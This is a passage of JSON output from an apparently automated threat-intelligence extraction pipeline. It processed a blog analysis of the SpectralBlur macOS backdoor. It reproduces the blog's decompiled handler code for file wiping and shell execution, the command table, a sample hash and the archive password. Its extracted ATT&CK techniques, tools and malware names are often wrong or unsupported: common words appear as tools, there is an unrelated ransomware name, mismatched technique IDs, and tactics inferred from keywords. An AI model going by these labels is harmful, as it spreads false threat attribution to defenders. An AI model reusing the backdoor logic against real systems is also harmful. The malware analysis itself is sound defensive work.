(procStruct) for this array  we can see each command number and its handler: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 8/11 procs: 0x0000000100008000 struct procStruct { 0x1  _proc_none } 0x000000010000800c struct procStruct { 0x2  _proc_shell } 0x0000000100008018 struct procStruct { 0x3  _proc_dir } 0x0000000100008024 struct procStruct { 0x4  _proc_upload } 0x0000000100008030 struct procStruct { 0x5  _proc_upload_content } 0x000000010000803c struct procStruct { 0x6  _proc_download } 0x0000000100008048 struct procStruct { 0x7  _proc_rmfile } 0x0000000100008054 struct procStruct { 0x8  _proc_testconn } 0x0000000100008060 struct procStruct { 0x9  _proc_getcfg } 0x000000010000806c struct procStruct { 0xa  _proc_setcfg } 0x0000000100008078 struct procStruct { 0xb  _proc_hibernate } 0x0000000100008084 struct procStruct { 0xc  _proc_sleep } 0x0000000100008090 struct procStruct { 0xd  _proc_die } 0x000000010000809c struct procStruct { 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 9/11 0xe  _proc_stop } 0x00000001000080a8 struct procStruct { 0xf  _proc_restart } Recall we saw the names of each command handler (_proc_ ) in the output of nm. And  though we can guess the likely capability of eahc command from its name  let s look a few to confirm. The proc_rmfile will remove a file by invoking the unlink API. However  we can also see that it first opens the file (fopen) and overwrites its contents with zero: 1int proc_rmfile(int arg0  int arg1) { 2 var_4   arg0  3 var_10   arg1  4 var_18   var_10   0x10  5 file   fopen(var_18   rb  )  6 if (file    0x0) { 7 fseek(file  0x0  0x2)  8 var_28   ftell(file)  9 fseek(file  0x0  0x0)  10 var_30   0x5000  11 if (var_28   var_30) { 12 var_30   var_28  13 } 14 var_38   malloc(var_30)  15 _memset_chk(var_38  0x0  var_30  0xffffffffffffffff)  16 fwrite(var_38  0x1  var_30  file)  17 free(var_38)  18 fclose(file)  19 } 20 rdx   unlink(var_18)  21 rax   0x0  22 if (rdx    0x0) { 23 rax   0x1  24 } 25 return _write_packet_value(var_4   var_10  rax)  26}  each command will also report a result by invoking the malware write_packet_value API. The proc_restart will terminate the child process: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 10/11 1int main(...) 2 3 call fork 4 mov dword [childPID]  eax 5 6int proc_restart(int arg0  int arg1) 7 8 kill( childPID  0x9)  9 return write_packet_value(arg0   arg1  0x0)  Finally  let s look at the proc_shell  which executed a command by write ing to the pseudo-terminal that was opened (via posix_openpt) previously: 1int main(...) 2 3 call posix_openpt 4 mov dword [pt]  eax 5 6int proc_shell(...) { 7 var_8   arg0  8 var_10   arg1  9 if (write( pt  var_10   0x10  strlen(var_10   0x10))    0x0) { 10 var_4   _write_packet_value(var_8   var_10  0x0)  11 } The other commands execute actions consistent with their respective names. Conclusion Today we dug into SpectralBlur  a DPRK backdoor. Building upon Greg s research we further detailed its capabilities. Interested in learning more Mac Malware Analysis Techniques  6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 11/11",
            "commands": [],
            "file_paths": [
              "/FileMonitor.app/Contents/MacOS/FileMonitor",
              "/t.co/P2TGw98UR6",
              "/Users/user/Downloads/).",
              "/Users/user/Downloads/macshare.d\",",
              "/.macshare:",
              "/Users/Shared/.macshare.",
              "/objective-see.org/blog/blog_0x78.html",
              "/.macshare",
              "/Users/user/Downloads/macshare.d\"",
              "/blog/blog_0x78.html",
              "/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "backdoor",
              "conti",
              "malware",
              "rat"
            ],
            "tools": [
              "at",
              "net",
              "ping",
              "reg",
              "sc"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "FileMonitor.app",
              "SpectralBlur.zip",
              "com.apple.main",
              "mac.jpg",
              "objective-see.org",
              "pic.twitter.com",
              "t.co"
            ],
            "hashes": {
              "sha1": [
                "06c8c84fb0a85bdf3520608b0a5c910b77e3b8c1"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Exploit Public-Facing Application"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /FileMonitor.app/Contents/MacOS/FileMonitor\n- /t.co/P2TGw98UR6\n- /Users/user/Downloads/).\n- /Users/user/Downloads/macshare.d\",\n- /.macshare:\n\n**Network Indicators:**\n- com.apple.main\n- pic.twitter.com\n- objective-see.org\n- https://objective-see.org/blog/blog_0x78.html\n- mac.jpg\n- https://t.co/P2TGw98UR6\n- SpectralBlur.zip\n- FileMonitor.app\n- t.co\n\n**Key Security Terms:** terminate, execute, extract, c2, encrypt, create, download, malware, backdoor, delete"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 38.271,
          "llm_processing_time_ms": 2487.139
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "extracted_ttps": [
          {
            "ttp_id": "63aeec7a-07f5-4db4-8640-d97b31bdcd6d",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Pseudo-Terminal",
            "attack_id": "T1094",
            "tactic": "Defense Evasion",
            "description": "The malware sets up a pseudo-terminal via grantpt",
            "confidence_score": 0.704,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "grantpt",
              "posix_openpt"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f3691030-fbc2-49c3-a980-41f9d6a9931a",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Network Communication",
            "attack_id": "T1043",
            "tactic": "Command and Control",
            "description": "The malware communicates with its C2 server",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "socket_recv",
              "socket_send"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3b817673-7fef-4c12-acff-1d30dcf8bca1",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The malware uses a shell to execute commands",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "/bin/sh",
              "SpectralBlur/.macshare"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3c065de9-819d-4ba5-8050-bccbe733abe7",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "File and Directory Permissions Modification",
            "attack_id": "T1222",
            "tactic": "Privilege Escalation",
            "description": "The malware modifies file permissions to hide itself",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "/Users/Shared/.macshare",
              "macshare.d"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e2c9f12d-f4cc-4f1c-8ef6-1f3bc7a3e5dd",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Data Encrypted",
            "attack_id": "T1027",
            "tactic": "Exfiltration",
            "description": "The malware encrypts its config and network traffic",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "xcrypt function",
              "custom stream cipher"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f59baba6-d7b3-4ae8-8672-a3ea66ebde69",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "The malware forks itself to complicate dynamic analysis",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "fork",
              "posix_openpt"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "64a811d6-4e42-4a2a-8acf-95143de42d4d",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "The malware creates or modifies system processes",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_testconn function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "df615a20-db0d-481e-9756-99a591decd52",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Process Creation",
            "attack_id": "T1055",
            "tactic": "Execution",
            "description": "The malware creates new processes",
            "confidence_score": 0.651,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.152,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "execve",
              "fork"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "45ff3ea1-3a0f-4a43-b99d-8379e04c252b",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Exfiltration",
            "description": "The malware uploads and downloads files",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_upload function",
              "proc_download function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e67ea8bf-2c1e-4bb1-bc42-6c3b83c489ec",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Indicator Removal on Host",
            "attack_id": "T1070",
            "tactic": "Defense Evasion",
            "description": "The malware removes indicators from the host",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_rmfile function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e7be2904-214d-4a46-ac75-6cf84dc771b8",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The malware gathers file and directory information",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_dir function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3ece81df-b7ab-4d0b-a588-d93f18c8c1ee",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Network Connections Discovery",
            "attack_id": "T1049",
            "tactic": "Discovery",
            "description": "The malware gathers system network connections information",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "socket_connect"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "db9937db-109f-47f0-bddb-4c1320459dc7",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The malware gathers system information",
            "confidence_score": 0.645,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "gethostbyname",
              "getlogin"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8d31961f-3ac7-4452-9580-21799ff0ecc6",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Network Configuration Discovery",
            "attack_id": "T1016",
            "tactic": "Discovery",
            "description": "The malware gathers network configuration information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "getsockopt"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "745eede0-841a-4b3e-9efb-60d8d11176ca",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Owner/User Discovery",
            "attack_id": "T1033",
            "tactic": "Discovery",
            "description": "The malware gathers system owner/user information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "getpwuid"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "371f6daa-dbfa-4517-b092-9a76ecbd25ce",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1010",
            "tactic": "Discovery",
            "description": "The malware gathers application window information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_none function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6726c6a3-826f-4de3-a34a-15de553041de",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Time Discovery",
            "attack_id": "T1124",
            "tactic": "Discovery",
            "description": "The malware gathers system time information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "time"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9b22caa7-f7ca-4fc2-8338-793018aba7c8",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "File Deletion",
            "attack_id": "T1107",
            "tactic": "Defense Evasion",
            "description": "The malware deletes files",
            "confidence_score": 0.642,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "unlink API",
              "proc_rmfile function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7e324859-8d69-42d2-9516-95e1b10d3c1f",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Input Capture",
            "attack_id": "T1056",
            "tactic": "Collection",
            "description": "The malware captures input",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_getcfg function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a5815efa-7ada-45d0-a5b4-70aacab09398",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ee677673-a2ef-4779-873e-82aedd2258c1",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Process Injection",
            "attack_id": "T1055.002",
            "tactic": "Defense Evasion",
            "description": "The malware injects processes",
            "confidence_score": 0.632,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.13,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "_pthread_create"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a2215e1c-1c16-4f0a-8abb-ec607816ce57",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b608f4ed-b47d-4955-b429-2044f8318a38",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "6c97146f-9d3e-43d7-beee-9e18c201d569",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027.003",
            "tactic": "Exfiltration",
            "description": "The malware uses obfuscated strings",
            "confidence_score": 0.629,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "obfuscated strings"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cd275b9a-4e48-4554-9e6d-dd698629e02e",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c76a062a-b765-41fd-81b9-2e8771a1f001",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "fb4ee95b-12fa-4a4e-a999-ae29f9ad9e7d",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "Objective-See s Blog objective-see.org/blog/blog_0x78.html Analyzing DPRK s SpectralBlur The first malware of 2024 is (already) here  by: Patrick Wardle / January 4  2024     Want to play along  As  Sharing is Caring  I ve uploaded a sample of the malware SpectralBlur.zip to our public macOS malware collection. The password is: infect3d ...please though  don t infect yourself    Background Not three days into 2024 Greg Lesnewich tweeted the following:  100DaysofYARA day 03 - talking SpectralBlur  a MacOS (and other OS   ) backdoor linked to TA444/Bluenoroff  that I suspect is a cousin of the KandyKorn family our pals at Elastic found  https://t.co/P2TGw98UR6 pic.twitter.com/Y8U3hsjNiF   Greg Lesnewich (@greglesnewich) January 3  2024 In both his twitter (err  X) thread and in a subsequent posting he provided a comprehensive background and triage of the malware dubbed SpectralBlur. In terms of its capabilities he noted: SpectralBlur is a moderately capable backdoor  that can upload/download files  run a shell  update its configuration  delete files  hibernate or sleep  based on commands issued from the C2. -Greg He also pointed out similarities to/overlaps with the DPRK malware known as KandyKorn (that we covered in our  Mac Malware of 2024  report)  while also pointing out there was differences  leading him to conclude: We can see some similarities ... to the KandyKorn. But these feel like families developed by different folks with the same sort of requirements. -Greg 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 1/11 Greg s writeup  though focusing more on the discovery and triage of the SpectralBlur  is excellent a read  and provides essential background and context for our more indepth analysis. Have a read: 100DaysofYARA - SpectralBlur Greg ended his write up  nothing that he hadn t had time yet to fully analyze the sample  but  if anyone in the community is keen on it  go for it   . As I m rather obsessed with (new) Mac malware I decided to dig in more. Triage The sample of SpectralBlur mentioned in his tweets and triage has a SHA-1 hash of 06c8c84fb0a85bdf3520608b0a5c910b77e3b8c1. Popping over to VirusTotal to grab the sample  we can see that currently it is not flagged as malicious by any of the AV engines: SpectralBlur on VirusTotal (Scan Date: Aug. 2023) Triggering a rescan of the malware on VirusTotal shows it is (now) detected by at least one AV engine (ESET). Moreover its worth noting that the previous scan of the malware (refereneced in the screenshot above) was performed in August 2023. Thus  though at that time no AV engine flagged the item as malicous  between now and then  detections could have been added. Looking at telemetric data we can see its name is either .macshare or mac.jpg  and at least on one macOS system it was found in /Users/Shared/.macshare. Prefixing the name with a  .  will hide the file from Finder (unless the viewing of hidden files has been enabled). This SpectralBlur sample was initially submitted to VirusTotal on 2023-08-16 from Colombia (CO). Interestingly in VirusTotal s telemetric data  we can also see that at least one of Objective-See s tools (which  integrate with VirusTotal  for example to allow users to submit unrecognized files) encountered the malware in the wild too  how cool  Using WhatsYourSign we can see the binary is not signed: WhatsYourSign shows the malware is not signed You can also extract codesigning information (or lack thereof) from the terminal via macOS s codesign utility: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 2/11   codesign -dvv SpectralBlur/.macshare SpectralBlur/.macshare: code object is not signed at all Via the terminal we can also see its a 64bit Intel (x86_64) binary:   file SpectralBlur/.macshare SpectralBlur/.macshare: Mach-O 64-bit executable x86_64 Next let s pull out any embedded strings  as this can give a good idea of the malware s capabilities and also guide continued analysis:   strings SpectralBlur/.macshare There is NO WARRANTY  to the extent permitted by law.  s.d /dev/null SHELL /bin/sh ... Other than some strings related to the shell  not a lot  Maybe others are obfuscated  (We also didn t show function names or API imports in the strings output  as these show up better via nm). Using nm we can extract symbols which will include the Malware s function names  as well as APIs that the malware calls into ( imports ). Let s start with just function names  which will be found the __TEXT segment/section: __text. We can use nm s -s to limit its output to just a specified segment/section: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 3/11   nm -s __TEXT __text SpectralBlur/.macshare 0000000100001540 T _hangout 00000001000034f0 T _init 0000000100001570 T _init_fcontext 0000000100001870 T _load_config 0000000100003650 T _main 0000000100002a10 T _mainprocess 0000000100003370 T _mainthread 00000001000031c0 T _openchannel 00000001000029a0 T _proc_die 0000000100001b10 T _proc_dir 0000000100002420 T _proc_download 0000000100002290 T _proc_download_content 00000001000027e0 T _proc_getcfg 00000001000028c0 T _proc_hibernate 00000001000019f0 T _proc_none 00000001000029d0 T _proc_restart 00000001000025a0 T _proc_rmfile 0000000100002860 T _proc_setcfg 0000000100001a90 T _proc_shell 0000000100002930 T _proc_sleep 0000000100001a20 T 